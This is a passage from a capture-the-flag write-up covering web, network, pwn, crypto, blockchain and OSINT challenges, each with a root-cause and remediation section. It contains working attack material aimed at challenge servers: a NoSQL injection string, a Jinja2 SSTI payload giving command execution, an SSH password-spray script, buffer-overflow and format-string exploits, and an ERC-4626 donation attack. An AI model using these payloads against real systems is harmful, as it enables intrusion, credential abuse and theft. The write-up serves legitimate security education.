+<p>JavaScript operator precedence binds <code>&amp;&amp;</code> tighter than <code>||</code>, so this is <code>(a=='') || true || ('' &amp;&amp; b)</code> → always <code>true</code>, and the filter matches every document.</p>
+<ol start="3">
+<li>Request and response:</li>
+</ol>
+<pre><code>curl -G 'https://wcsc-fruit-shop.chals.io/search.php' --data-urlencode &quot;search=' || true || '&quot;
+→ {&quot;ok&quot;:true,&quot;count&quot;:9,&quot;results&quot;:[
+     {&quot;product_name&quot;:&quot;Honeycrisp Apple&quot;,&quot;price&quot;:2.49},
+     ... (8 public products) ...,
+     {&quot;product_name&quot;:&quot;WCSC{m4nG03z_4nD_M0ngOs}&quot;,&quot;price&quot;:0}
+   ]}
+</code></pre>
+<p>Since the projection includes <code>product_name</code>, the flag document's name field is returned directly.</p>
+<h3 id="4-result_5">4. Result</h3>
+<ul>
+<li><strong>Flag:</strong> <code>WCSC{m4nG03z_4nD_M0ngOs}</code></li>
+<li>Time obtained: 2026-10-30 13:45 UTC (22:45 KST)</li>
+<li>2 requests total (2 GETs). The cause was identified from the source and exploited on the first attempt; no brute forcing or scanning.</li>
+<li>Evidence: <code>evidence/wcsc-fruit-shop/01-search-baseline.json</code>, <code>02-where-injection.json</code></li>
+</ul>
+<h3 id="5-root-cause-and-remediation_4">5. Root cause and remediation</h3>
+<ul>
+<li><strong>Classification:</strong> CWE-943 / CWE-89 family — NoSQL injection. More precisely, the JavaScript passed to MongoDB's <code>$where</code> is built by string concatenation, so it is CWE-94 (code injection).</li>
+<li><strong>Fixes</strong></li>
+<li>Do not use <code>$where</code>. A name search needs only ordinary query operators:</li>
+</ul>
+<pre><code class="language-php">$filter = ['product_name' =&gt; new MongoDB\BSON\Regex('^' . preg_quote($term, '/'), 'i'),
+           'is_public' =&gt; true];
+</code></pre>
+<p>Escape input even for regex, and prefer a text index with <code>$text</code> where possible.
+  - If <code>$where</code> is unavoidable, do not concatenate input into the JS source; otherwise disable server-side scripting with <code>--noscripting</code>.
+  - Do not put the authorisation condition (<code>is_public</code>) inside the same expression as user input. Placing it as a separate top-level condition makes it impossible to bypass with <code>||</code>.
+  - Do not store secrets in the same collection and schema that ordinary user queries reach (use a separate collection with separate read permissions).</p>
+<hr>
+<h2 id="6-web-jinja2ninja-250">6. [Web] Jinja2Ninja — 250</h2>
+<h3 id="1-problem-summary_6">1. Problem summary</h3>
+<ul>
+<li>Provided: server URL <code>https://wcsc-jinja2ninja.chals.io</code> (source not published)</li>
+<li>Goal: flag <code>WCSC{...}</code></li>
+</ul>
+<h3 id="2-analysis_6">2. Analysis</h3>
+<p><strong>Observations</strong></p>
+<ul>
+<li><code>GET /</code> response header <code>Server: Werkzeug/3.1.8 Python/3.12.13</code> → Flask application (<code>evidence/wcsc-jinja/01-root.headers</code>)</li>
+<li>One input point: <code>POST /create</code> with fields <code>top_text</code> and <code>bottom_text</code>. Both values are emitted into <code>div.top-text</code> and <code>div.bottom-text</code> in the response HTML (<code>02-create-plain.html</code>)</li>
+<li><code>top_text={{7*7}}</code> → <code>49</code>, <code>bottom_text={{"a"+"b"}}</code> → <code>ab</code> → confirms server-side template rendering (<code>03-ssti-probe.html</code>)</li>
+</ul>
+<p><strong>Root cause (from the recovered <code>app.py</code>, <code>08-app.py.txt</code>)</strong></p>
+<pre><code class="language-python">@app.route('/create', methods=['POST'])
+def create():
+    top_text = request.form.get(&quot;top_text&quot;)
+    bottom_text = request.form.get(&quot;bottom_text&quot;)
+    ...
+    return render_template_string(&quot;&quot;&quot;... &lt;div class=&quot;meme-text top-text&quot;&gt;&quot;&quot;&quot;
+        + top_text + &quot;&quot;&quot;&lt;/div&gt;
+        &lt;div class=&quot;meme-text bottom-text&quot;&gt;&quot;&quot;&quot; + bottom_text + &quot;&quot;&quot;&lt;/div&gt; ...&quot;&quot;&quot;)
+</code></pre>
+<p>User input is concatenated into the <em>template source</em> rather than passed as template data, and then compiled by <code>render_template_string</code>. There is no keyword deny list and no <code>SandboxedEnvironment</code>.</p>
+<h3 id="3-steps_6">3. Steps</h3>
+<ol>
+<li>Survey input points: the form on <code>/</code> leads to the two fields of <code>POST /create</code>, which are the only user-controlled paths.</li>
+<li>Detect template rendering:</li>
+</ol>
+<pre><code>curl -X POST https://wcsc-jinja2ninja.chals.io/create \
+  --data-urlencode 'top_text={{7*7}}' --data-urlencode 'bottom_text={{&quot;a&quot;+&quot;b&quot;}}'
+→ &lt;div class=&quot;meme-text top-text&quot;&gt;49&lt;/div&gt;
+  &lt;div class=&quot;meme-text bottom-text&quot;&gt;ab&lt;/div&gt;
+</code></pre>
+<ol start="3">
+<li>Check what is exposed: <code>{{config}}</code> → the whole Flask config (no flag, <code>DEBUG=False</code>); <code>{{self}}</code> → <code>&lt;TemplateReference None&gt;</code>. No sign of filtering (<code>04-config-self.html</code>).</li>
+<li>Escape the sandbox → RCE. Obtain the <code>os</code> module through <code>__init__.__globals__</code> of the <code>cycler</code> global that Jinja2 exposes:</li>
+</ol>
+<pre><code>--data-urlencode &quot;top_text={{cycler.__init__.__globals__.os.popen('id').read()}}&quot;
+→ uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<ol start="5">
+<li>Enumerate the filesystem: <code>pwd</code> → <code>/app</code>; <code>ls -la /app</code> → <code>app.py</code>, <code>Dockerfile</code>, <code>flag.txt</code> (26 bytes) (<code>06-enum.html</code>)</li>
+<li>Read the flag:</li>
+</ol>
+<pre><code>--data-urlencode &quot;top_text={{cycler.__init__.__globals__.os.popen('cat /app/flag.txt').read()}}&quot;
+→ WCSC{7h15_SSTI_15_s0_r4d}
+</code></pre>
+<h3 id="4-result_6">4. Result</h3>
+<ul>
+<li><strong>Flag:</strong> <code>WCSC{7h15_SSTI_15_s0_r4d}</code></li>
+<li>Time obtained: 2026-10-30 13:44 UTC (22:44 KST)</li>
+<li>7 requests total (1 GET / 6 POST)</li>
+<li>Evidence: <code>evidence/wcsc-jinja/01-root.headers</code> through <code>08-app.py.txt</code></li>
+</ul>
+<h3 id="5-root-cause-and-remediation_5">5. Root cause and remediation</h3>
+<ul>
+<li><strong>Classification:</strong> CWE-1336 (improper neutralisation of special elements used in a template engine — SSTI) → CWE-94 code injection → RCE</li>
+<li><strong>Fixes</strong></li>
+<li>Keep templates as fixed files and pass input only as context variables: <code>render_template("meme.html", top_text=top_text, ...)</code>. Never concatenate input into template source.</li>
+<li>If dynamic templates are unavoidable, use <code>jinja2.sandbox.SandboxedEnvironment</code> (deny lists are bypassable, so treat them as secondary).</li>
+<li>Stop using the Werkzeug development server (<code>app.run</code>) in production → use a WSGI server and an unprivileged user.</li>
+<li>Do not keep flags/secrets as plaintext files in the application working directory. This challenge did separate privileges with <code>USER www-data</code>, but <code>flag.txt</code> at mode <code>0644</code> made that meaningless.</li>
+</ul>
+<hr>
+<h2 id="7-miscnetwork-plenty-of-portals-250">7. [Misc/Network] Plenty of Portals — 250</h2>
+<p><strong>One-line summary:</strong> The exposed DMZ port (<code>0[.]cloud[.]chals[.]io:10650</code>) was cleartext POP3 (Dovecot). Logging in with the provided <code>glados:glados</code> credentials and retrieving the single message (<code>RETR 1</code>) revealed the flag in the body.</p>
+<h3 id="1-problem-summary_7">1. Problem summary</h3>
+<ul>
+<li>Provided: server <code>0[.]cloud[.]chals[.]io</code> port 10650, service account <code>glados:glados</code> (<code>challenges/wcsc-portals/README.md</code>)</li>
+<li>Goal: identify the service on the port and find the hidden secret (flag <code>WCSC{...}</code>)</li>
+</ul>
+<h3 id="2-analysis_7">2. Analysis</h3>
+<ul>
+<li><strong>Observation:</strong> connecting without sending anything yields the banner <code>+OK Dovecot (Ubuntu) ready.</code> (<code>evidence/wcsc-portals/01_banner_passive.txt</code>) → POP3.</li>
+<li><code>CAPA</code> response: TOP, UIDL, RESP-CODES, PIPELINING, AUTH-RESP-CODE, USER, SASL PLAIN. No <code>STLS</code> → cleartext transport (<code>evidence/wcsc-portals/02_capa.txt</code>).</li>
+<li>After login, <code>STAT</code>/<code>LIST</code> show one message (291 octets) (<code>evidence/wcsc-portals/03_login_list.txt</code>).</li>
+<li><strong>Root cause:</strong> a weak service account (username equals password), cleartext POP3 exposed externally, and a secret (activation key) stored as mail in the mailbox.</li>
+</ul>
+<h3 id="3-steps_7">3. Steps</h3>
+<ol>
+<li>Banner collection (one connection, nothing sent) → Dovecot POP3 (2026-10-30 20:03 per the notes).</li>
+<li><code>CAPA</code> + <code>QUIT</code> → capability list (2026-10-30 20:03).</li>
+<li><code>USER</code>/<code>PASS glados</code>, <code>STAT</code>, <code>LIST</code> (2026-10-30 20:04) → one message.</li>
+<li><code>RETR 1</code> (2026-10-30 20:04) → the flag in the body of a message from <code>cjohnson@aperturescience[.]com</code>.</li>
+</ol>
+<p>Reproduction (the original command was not recorded in the notes; this reproduces the same actions):</p>
+<pre><code class="language-bash">HOST=0.cloud.chals.io; PORT=10650   # this host is the only target
+{ sleep 1; printf 'USER glados\r\n'; sleep 1; printf 'PASS glados\r\n'; sleep 1;
+  printf 'STAT\r\nLIST\r\nRETR 1\r\nQUIT\r\n'; sleep 1; } | nc &quot;$HOST&quot; &quot;$PORT&quot;
+</code></pre>
+<p><code>RETR 1</code> response (<code>evidence/wcsc-portals/04_retr1.txt</code>):</p>
+<pre><code>From: cjohnson@aperturescience.com
+Subject: IT Doesn't Know Crap
+... here's that secret activation key for later - WCSC{W0rk1ng_W_P0rtAl5_Th3_C4k3_W4s_A_l13}.
+</code></pre>
+<h3 id="4-result_7">4. Result</h3>
+<ul>
+<li><strong>Flag:</strong> <code>WCSC{W0rk1ng_W_P0rtAl5_Th3_C4k3_W4s_A_l13}</code></li>
+<li>Time obtained: 2026-10-30 13:04 UTC (22:04 KST), per <code>notes/wcsc-portals.md</code> — converted from the workstation's local timezone (Asia/Bangkok, UTC+07)</li>
+<li>Evidence: <code>evidence/wcsc-portals/01_banner_passive.txt</code>, <code>02_capa.txt</code>, <code>03_login_list.txt</code>, <code>04_retr1.txt</code></li>
+</ul>
+<h3 id="5-root-cause-and-remediation_6">5. Root cause and remediation</h3>
+<ul>
+<li><strong>Classification:</strong> CWE-521 (weak password requirements), CWE-319 (cleartext transmission of sensitive information), CWE-312 (cleartext storage of sensitive information)</li>
+<li><strong>Fixes:</strong> give service accounts unique strong passwords; do not expose POP3 in the DMZ, and require POP3S/STLS if it is needed; do not store secrets or keys in mailboxes — use a secret management system.</li>
+</ul>
+<hr>
+<h2 id="8-miscnetwork-the-curious-500">8. [Misc/Network] The Curious — 500</h2>
+<p><strong>One-line summary:</strong> Spraying a fixed password (<code>Rainey2025!</code>) across 237 candidate usernames found the SSH account <code>ww2016</code>; an SSH <code>direct-tcpip</code> channel to the server's internal <code>127.0.0.1:80</code> dashboard then yielded the flag.</p>
+<h3 id="1-problem-summary_8">1. Problem summary</h3>
+<ul>
+<li>Provided: SSH server <code>0[.]cloud[.]chals[.]io</code> port 12358, leaked password <code>Rainey2025!</code>, <code>usernames.txt</code> (237 lines, <code>challenges/wcsc-curious/usernames.txt</code>), and a hint that a web service listens on internal port 80.</li>
+<li>Goal: access the server and read the secret (flag) from the internal dashboard.</li>
+</ul>
+<h3 id="2-analysis_8">2. Analysis</h3>
+<ul>
+<li><strong>Observation:</strong> 12358/tcp is OpenSSH 8.9p1 Ubuntu (<code>evidence/wcsc-curious/01_banner_passive.txt</code>).</li>
+<li>The password was held fixed while only usernames varied (this is not password brute forcing). The 33rd candidate succeeded (<code>evidence/wcsc-curious/02_ssh_spray.txt</code>).</li>
+<li>Internal <code>127.0.0.1:80</code> is Apache 2.4.52, page title "Dashboard / Internal Notes" (<code>evidence/wcsc-curious/03_internal_root.txt</code>).</li>
+<li><strong>Root cause:</strong> a leaked password reused across services; SSH password authentication allowed with no attempt limiting; TCP forwarding (<code>AllowTcpForwarding</code>) permitted, exposing internal services.</li>
+</ul>
+<h3 id="3-steps_8">3. Steps</h3>
+<ol>
+<li>Banner check → SSH (2026-10-30 20:12 per the notes).</li>
+<li>Username spray: <code>tools/wcsc-curious/find_user.py</code> (paramiko, serial, 0.4 s delay between attempts)</li>
+</ol>
+<pre><code class="language-bash">python3 tools/wcsc-curious/find_user.py challenges/wcsc-curious/usernames.txt
+</code></pre>
+<p>Core logic:</p>
+<pre><code class="language-python">HOST, PORT = &quot;0.cloud.chals.io&quot;, 12358
+PW = &quot;Rainey2025!&quot;
+c.connect(HOST, PORT, username=u, password=PW, allow_agent=False, look_for_keys=False, ...)
+</code></pre>
+<p>→ <code>[+] SUCCESS: ww2016</code></p>
+<ol start="3">
+<li>Reach the internal web service: <code>tools/wcsc-curious/probe_internal.py</code> opens a <code>direct-tcpip</code> channel on the transport after login and sends <code>GET /</code></li>
+</ol>
+<pre><code class="language-bash">python3 tools/wcsc-curious/probe_internal.py
+</code></pre>
+<pre><code class="language-python">chan = t.open_channel(&quot;direct-tcpip&quot;, (&quot;127.0.0.1&quot;, 80), (&quot;127.0.0.1&quot;, 0))
+chan.sendall(b&quot;GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n&quot;)
+</code></pre>
+<p>The flag appears in the Secret note of the returned HTML (<code>evidence/wcsc-curious/03_internal_root.txt</code>):
+<code>&lt;strong&gt;Secret:&lt;/strong&gt; WCSC{UR_2_FuR1oU5}</code></p>
+<h3 id="4-result_8">4. Result</h3>
+<ul>
+<li><strong>Flag:</strong> <code>WCSC{UR_2_FuR1oU5}</code></li>
+<li>Time obtained: 2026-10-30 13:12 UTC (22:12 KST), per <code>notes/wcsc-curious.md</code> — converted from the workstation's local timezone (Asia/Bangkok, UTC+07)</li>
+<li>Evidence: <code>evidence/wcsc-curious/01_banner_passive.txt</code>, <code>02_ssh_spray.txt</code>, <code>03_internal_root.txt</code></li>
+</ul>
+<h3 id="5-root-cause-and-remediation_7">5. Root cause and remediation</h3>
+<ul>
+<li><strong>Classification:</strong> CWE-521 (weak/reused password), CWE-307 (improper restriction of excessive authentication attempts), CWE-668 (exposure of resources to the wrong sphere)</li>
+<li><strong>Fixes:</strong> allow public-key authentication only (<code>PasswordAuthentication no</code>); restrict TCP forwarding per account (<code>AllowTcpForwarding no</code> / <code>PermitOpen</code>); rate-limit attempts (e.g. fail2ban); put separate authentication in front of the internal dashboard; retire the leaked password.</li>
+</ul>
+<hr>
+<h2 id="9-pwn-bookshelves-250">9. [Pwn] Bookshelves — 250</h2>
+<p><strong>One-line summary:</strong> <code>place_book()</code> reads 256 bytes into a 64-byte stack buffer; overwriting the return address at offset 72 with a <code>ret</code> gadget followed by <code>restricted_section</code> prints <code>flag.txt</code> (ret2win).</p>
+<h3 id="1-problem-summary_9">1. Problem summary</h3>
+<ul>
+<li>Provided: ELF <code>bookshelves</code>, source <code>bookshelves.c</code> (<code>challenges/wcsc-bookshelves/</code>), server <code>0[.]cloud[.]chals[.]io</code> 14466</li>
+<li>Goal: reach the restricted section and read <code>flag.txt</code></li>
+</ul>
+<h3 id="2-analysis_9">2. Analysis</h3>
+<ul>
+<li>Mitigations (per the notes): no PIE, no canary, NX.</li>
+<li>Vulnerable code (<code>bookshelves.c</code>):</li>
+</ul>
+<pre><code class="language-c">void place_book(void) {
+    char shelf[64];
+    ...
+    read(0, shelf, 256);   // 256 bytes into a 64-byte buffer
+</code></pre>
+<ul>
+<li><code>restricted_section()</code> (0x4011f7) reads and prints <code>flag.txt</code> then calls <code>exit(0)</code>, but is never referenced.</li>
+<li>Offset = 64 (buffer) + 8 (saved rbp) = 72. With no canary and no PIE, the return address can be overwritten with a fixed address.</li>
+<li>A <code>ret</code> gadget at 0x401016 is placed first to realign the stack to 16 bytes (for <code>movaps</code>).</li>
+</ul>
+<h3 id="3-steps_9">3. Steps</h3>
+<ol>
+<li>Identify the vulnerability and the win function from the source.</li>
+<li>Payload: <code>"A"*72 + p64(0x401016) + p64(0x4011f7)</code></li>
+<li><code>tools/wcsc-bookshelves/exploit.py</code> (verified locally against a placeholder <code>flag.txt</code>, then run against the remote):</li>
+</ol>
+<pre><code class="language-python">RESTRICTED = 0x4011f7
+RET        = 0x401016  # stack-align gadget
+payload = b&quot;A&quot;*72 + p64(RET) + p64(RESTRICTED)
+p = remote(&quot;0.cloud.chals.io&quot;, 14466)   # local: process(&quot;./challenges/wcsc-bookshelves/bookshelves&quot;)
+p.recvuntil(b&quot;&gt; &quot;)
+p.send(payload)
+print(p.recvall(timeout=5).decode(errors=&quot;replace&quot;))
+</code></pre>
+<pre><code class="language-bash">python3 tools/wcsc-bookshelves/exploit.py --remote   # local: run with no arguments
+</code></pre>
+<p>Output (<code>evidence/wcsc-bookshelves/01_remote_exploit.txt</code>):
+<code>Special collection unlocked: WCSC{c4n7_f17_0n_7h3_5h3lv35!}</code></p>
+<h3 id="4-result_9">4. Result</h3>
+<ul>
+<li><strong>Flag:</strong> <code>WCSC{c4n7_f17_0n_7h3_5h3lv35!}</code></li>
+<li>Time obtained: 2026-10-30 13:13 UTC (22:13 KST), first entry in <code>notes/FLAGS.md</code> — converted from the workstation's local timezone (Asia/Bangkok, UTC+07)</li>
+<li>Evidence: <code>evidence/wcsc-bookshelves/01_remote_exploit.txt</code></li>
+</ul>
+<h3 id="5-root-cause-and-remediation_8">5. Root cause and remediation</h3>
+<ul>
+<li><strong>Classification:</strong> CWE-121 (stack-based buffer overflow)</li>
+<li><strong>Fixes:</strong> bound the read length with <code>sizeof(shelf)</code>; enable stack canaries (<code>-fstack-protector-strong</code>), PIE and Full RELRO; remove unused sensitive functions.</li>
+</ul>
+<hr>
+<h2 id="10-pwn-dewey-decimal-375">10. [Pwn] Dewey Decimal — 375</h2>
+<p><strong>One-line summary:</strong> The search term is passed to <code>printf(buf)</code> directly, giving a format string vulnerability; leaking the stack secret code with <code>%17$lu</code> and submitting it in the same connection yields <code>flag.txt</code>.</p>
+<h3 id="1-problem-summary_10">1. Problem summary</h3>
+<ul>
+<li>Provided: ELF <code>dewey_decimal</code> (<code>challenges/wcsc-dewey/</code>), server <code>0[.]cloud[.]chals[.]io</code> 16046. Description: "the output format looks odd"; a correct Dewey Decimal verification code is required.</li>
+<li>Goal: recover the verification code so <code>restricted_archive()</code> prints the flag.</li>
+</ul>
+<h3 id="2-analysis_10">2. Analysis</h3>
+<ul>
+<li>Mitigations (per the notes): no canary, no PIE, NX.</li>
+<li><code>catalog_system()</code> stores a secret code <code>rand()%0xdbba0+0x186a0</code> (= 100000..999999) at <code>[rbp-0x18]</code>.</li>
+<li>The search term is read with <code>fgets</code> into <code>[rbp-0x60]</code> and printed with <code>printf(buf)</code> at 0x4013ab → format string vulnerability.</li>
+<li>Afterwards a <code>scanf("%lu")</code> value is compared to the secret code; on a match <code>restricted_archive()</code> prints <code>flag.txt</code>.</li>
+<li>The secret code sits at printf argument index 17 (<code>%17$lu</code>).</li>
+<li>Deriving index 17: the <code>catalog_system</code> prologue is <code>push rbp; push rbx; sub rsp,0x68</code>, so at the <code>printf</code> call <code>rsp = rbp-0x70</code>. On x86-64 the first stack qword <code>[rsp]</code> is <code>%6$</code>, hence <code>%n$ = [rsp+(n-6)*8]</code>. The secret code at <code>[rbp-0x18]</code> = <code>[rsp+0x58]</code> → <code>0x58/8+6 = 17</code>. Confirmed empirically by sending <code>AA.%15$lu.%16$lu.%17$lu…</code> locally and observing that only <code>%17$</code> fell in the 100000–999999 range (402266).</li>
+</ul>
+<h3 id="3-steps_10">3. Steps</h3>
+<ol>
+<li>Send <code>|%17$lu|</code> as the search term; of the echoed values, take the number in the 100000–999999 range as the secret code.</li>
+<li>In the same connection, submit that number as the verification code.</li>
+</ol>
+<pre><code class="language-python">p.recvuntil(b&quot;&gt; &quot;)
+p.sendline(b&quot;|%17$lu|&quot;)
+text = p.recvuntil(b&quot;&gt; &quot;, timeout=5).decode(errors=&quot;replace&quot;)
+nums = [int(x) for x in re.findall(r&quot;\|(\d+)\|&quot;, text)]
+code = next(n for n in nums if 100000 &lt;= n &lt;= 999999)
+p.sendline(str(code).encode())
+print(p.recvall(timeout=5).decode(errors=&quot;replace&quot;))
+</code></pre>
+<pre><code class="language-bash">python3 tools/wcsc-dewey/exploit.py --remote   # local: run with no arguments (placeholder flag)
+</code></pre>
+<p>Run log (<code>evidence/wcsc-dewey/01_remote_exploit.txt</code>): <code>leaked longs: [840302]</code>, <code>using code 840302</code>, then
+<code>Classification verified! Access granted to the restricted archives: WCSC{d3w3y_h45_4_5y573m}</code></p>
+<p>(The code differs per connection, so the leak and the submission must happen within the same connection.)</p>
+<h3 id="4-result_10">4. Result</h3>
+<ul>
+<li><strong>Flag:</strong> <code>WCSC{d3w3y_h45_4_5y573m}</code></li>
+<li>Time obtained: 2026-10-30 13:20 UTC (22:20 KST), first entry in <code>notes/FLAGS.md</code> — converted from the workstation's local timezone (Asia/Bangkok, UTC+07)</li>
+<li>Evidence: <code>evidence/wcsc-dewey/01_remote_exploit.txt</code></li>
+</ul>
+<h3 id="5-root-cause-and-remediation_9">5. Root cause and remediation</h3>
+<ul>
+<li><strong>Classification:</strong> CWE-134 (uncontrolled format string), CWE-200 (exposure of sensitive information)</li>
+<li><strong>Fixes:</strong> use a fixed format, <code>printf("%s", buf)</code>; build with <code>-Wformat-security</code> and <code>FORTIFY_SOURCE</code>; do not keep secrets where they are reachable as stack arguments; generate authentication codes with an unpredictable CSPRNG.</li>
+</ul>
+<hr>
+<h2 id="11-crypto-overrated-500">11. [Crypto] Overrated — 500</h2>
+<p><strong>One-line summary:</strong> The footer of a PASETO v4.local token pointed at a weak debug-PIN-derived key; using the authentication tag as an oracle, the PIN was brute forced (PIN 7252, key = sha256(PIN)) and the plaintext flag decrypted.</p>
+<h3 id="1-problem-summary_11">1. Problem summary</h3>
+<ul>
+<li>Provided: a PASETO token from a staging server, <code>challenges/wcsc-overrated/token.txt</code>. No server.</li>
+<li>Goal: extract the flag from the token.</li>
+</ul>
+<h3 id="2-analysis_11">2. Analysis</h3>
+<ul>
+<li><strong>Observation:</strong> base64url-decoding the footer gives <code>a2lkOmRlYnVnLXBpbi1rZXk</code> → <code>kid:debug-pin-key</code>, implying the key is derived from a weak debug PIN.</li>
+<li><code>pyseto</code> was unavailable in the environment, so v4.local decryption was implemented from scratch (<code>tools/wcsc-overrated/paseto_v4.py</code>).</li>
+<li>Structure: <code>payload = nonce(32) || ciphertext || tag(32)</code></li>
+<li><code>Ek||n2 = BLAKE2b-56(key, "paseto-encryption-key"||n)</code>, <code>Ak = BLAKE2b-32(key, "paseto-auth-key-for-aead"||n)</code></li>
+<li><code>tag = BLAKE2b-32(key=Ak, PAE(header, n, c, footer, implicit))</code>; encryption is XChaCha20 (HChaCha20 subkey)</li>
+<li>The implementation was validated against the official PASETO test vector 4-E-1.</li>
+<li><strong>Root cause:</strong> a symmetric key derived from a low-entropy PIN, which turns tag verification into an offline oracle and makes brute forcing possible.</li>
+</ul>
+<h3 id="3-steps_11">3. Steps</h3>
+<ol>
+<li><code>v4_local_decrypt(key, token)</code> decides key correctness by tag match (returns the plaintext on a match, <code>None</code> otherwise):</li>
+</ol>
+<pre><code class="language-python">t2 = hashlib.blake2b(pre, key=Ak, digest_size=32).digest()
+if t2 != t: return None
+return xchacha20(Ek, n2, c)
+</code></pre>
+<ol start="2">
+<li><code>tools/wcsc-overrated/brute.py</code> tries 6 key-derivation schemes (sha256, blake2b, zero padding, repetition, md5, …) for each PIN from 0 to N:</li>
+</ol>
+<pre><code class="language-bash">python3 tools/wcsc-overrated/brute.py 1000000   # argument = PIN upper bound (default 1000000)
+</code></pre>
+<p>Result: PIN 7252, key = <code>sha256("7252")</code> (= <code>227ff6c6...</code>; only the prefix is recorded in the notes). Plaintext:
+<code>{"sub":"guest-user","role":"guest","flag":"WCSC{jwt_overrated}","note":"Only admins can read..."}</code></p>
+<h3 id="4-result_11">4. Result</h3>
+<ul>
+<li><strong>Flag:</strong> <code>WCSC{jwt_overrated}</code></li>
+<li>Time obtained: 2026-10-30 13:26 UTC (22:26 KST), first entry in <code>notes/FLAGS.md</code> — converted from the workstation's local timezone (Asia/Bangkok, UTC+07)</li>
+<li>Evidence: no separate solver output was saved under <code>evidence/</code> (not recorded). Reproducible with <code>brute.py</code> and <code>challenges/wcsc-overrated/token.txt</code>.</li>
+</ul>
+<h3 id="5-root-cause-and-remediation_10">5. Root cause and remediation</h3>
+<ul>
+<li><strong>Classification:</strong> CWE-331 (insufficient entropy), CWE-321 / CWE-798 family (use of a predictable key)</li>
+<li><strong>Fixes:</strong> use a 256-bit CSPRNG key; never use a low-entropy value such as a PIN as a key (and if unavoidable, run it through a KDF like Argon2 with a long salt); do not put sensitive values (flags/secrets) in <code>local</code> tokens; do not reveal key provenance hints in the footer/<code>kid</code>.</li>
+</ul>
+<hr>
+<h2 id="12-blockchaincrypto-sell-your-ethereum-750">12. [Blockchain/Crypto] Sell Your Ethereum — 750</h2>
+<p><strong>One-line summary:</strong> An ERC-4626 inflation (donation) attack on <code>InflatableVault</code> steals the victim's deposit through rounding; reproducing the test arithmetic in Python gave the final balance, from which the <code>flag.zip</code> password was derived and the flag decrypted.</p>
+<h3 id="1-problem-summary_12">1. Problem summary</h3>
+<ul>
+<li>Provided: Foundry project <code>challenges/wcsc-ethereum/sell_your_ethereum.zip</code> (<code>flag.zip</code> is ZipCrypto, CRC <code>1ff5da37</code>). No server.</li>
+<li>Goal: place attack code in the test's PLAYER CODE slot so the attacker's balance exceeds the starting value (10000e18), then open <code>flag.zip</code> with the password derived from that balance.</li>
+</ul>
+<h3 id="2-analysis_12">2. Analysis</h3>
+<ul>
+<li><code>src/InflatableVault.sol</code> is an ERC-4626-style vault. Share computation rounds down and <code>totalAssets()</code> reads <code>asset.balanceOf(address(this))</code> directly.</li>
+<li><code>deposit</code>: if <code>totalShares == 0</code> then <code>shares = assets</code>, otherwise <code>shares = assets*totalShares/totalAssetsBefore</code> (floor).</li>
+<li>Transferring directly to the vault raises <code>totalAssets</code> only, inflating the share price.</li>
+<li>Password (per the <code>solve.py</code> comment): <code>keccak256(abi.encodePacked(uint256(token.balanceOf(attacker))))</code>. The exact final balance is required.</li>
+</ul>
+<h3 id="3-steps_12">3. Steps</h3>
+<p>Attack code (<code>challenges/wcsc-ethereum/exploit_snippet.sol</code>, at the PLAYER CODE position for <code>forge test -vv</code>):</p>
+<pre><code class="language-solidity">vm.startPrank(attacker);
+token.approve(address(vault), type(uint256).max);
+vault.deposit(1);                                  // 1 wei -&gt; 1 share
+token.transfer(address(vault), 50 * 10**18);       // donate to inflate the share price
+vm.stopPrank();
+</code></pre>
+<p>Effect: <code>totalAssets = 50e18+1</code>, <code>totalShares = 1</code>. When the victim deposits 5000e18, <code>shares = 5000e18*1/(50e18+1) = 99</code> (loss to rounding). The attacker redeeming 1 share recovers <code>1*(5050e18+1)/100 = 50.5e18</code>. Final balance = <code>10000.5e18 - 1 = 10000499999999999999999</code> wei (&gt; 10000e18).</p>
+<p>Since <code>forge</code> was not installed, <code>tools/wcsc-ethereum/solve.py</code> reproduces the test arithmetic (<code>simulate</code>) and validates each candidate final balance's keccak256 password against the ZipCrypto check byte and CRC of <code>flag.zip</code>.</p>
+<pre><code class="language-bash">python3 tools/wcsc-ethereum/solve.py flag.zip   # path to flag.zip inside/next to sell_your_ethereum.zip
+</code></pre>
+<p>Password: <code>0x603313b890dd8cdb649ca52b728aad1bfb4deca5737a4decb969dfed34247e8f</code></p>
+<p>Independent verification: <code>unzip -P 0x603313b8...7e8f flag.zip</code> extracted successfully (recorded in the notes; the output file was not saved under <code>evidence/</code>).</p>
+<h3 id="4-result_12">4. Result</h3>
+<ul>
+<li><strong>Flag:</strong> <code>WCSC{4626_inflation_rounding_success_2026}</code></li>
+<li>Time obtained: 2026-10-30 13:31 UTC (22:31 KST), first entry in <code>notes/FLAGS.md</code> — converted from the workstation's local timezone (Asia/Bangkok, UTC+07)</li>
+<li>Evidence: no separate evidence file (not recorded). The basis is <code>notes/wcsc-ethereum.md</code> and <code>tools/wcsc-ethereum/solve.py</code>.</li>
+<li>Note: there is no record of actually running <code>forge test</code> (not installed). The attack was validated by the Python reproduction and the ZipCrypto CRC match.</li>
+</ul>
+<h3 id="5-root-cause-and-remediation_11">5. Root cause and remediation</h3>
+<ul>
+<li><strong>Classification:</strong> ERC-4626 inflation / donation attack (CWE-682 incorrect calculation, CWE-840 business logic errors)</li>
+<li><strong>Fixes:</strong> use virtual shares/assets offset (OpenZeppelin ERC-4626 decimals offset); mint dead shares on the first deposit; track <code>totalAssets</code> with an internal accounting variable instead of reading <code>balanceOf</code> directly; round up on deposit and down on withdrawal, revert when <code>shares == 0</code>, and enforce a minimum deposit.</li>
+</ul>
+<hr>
+<h2 id="13-osint-lunas-nite-out-1000">13. [OSINT] Luna's Nite Out — 1000</h2>
+<p><strong>One-line summary:</strong> Reverse-geocoding the given coordinate located Konstanz, Germany; the Luna individual in the public Movebank study 1894170572 "Pet cat Germany MPIAB 2022" provided the position at 2021-12-19 06:16:33, rounded to four decimal places.</p>
+<h3 id="1-problem-summary_13">1. Problem summary</h3>
+<ul>
+<li>Provided: text only (no files, no server). "Luna was last seen at (47.68898, 9.140407) on 2021-12-18 09:01:11. Where was she at 2021-12-19 06:16:33?"</li>
+<li>Goal: flag format <code>WCSC{lat_long}</code>, rounded to four decimal places.</li>
+</ul>
+<h3 id="2-analysis_13">2. Analysis</h3>
+<ul>
+<li>Reverse geocoding (photon.komoot.io): a house at Eichbühlstraße 27, Wollmatingen, Konstanz, Germany.</li>
+<li>Konstanz is the home of Movebank (MPI of Animal Behavior / University of Konstanz). MPI-AB runs the "Cat Tracker" citizen-science project (collar GPS + accelerometer loggers) with data stored in Movebank.</li>
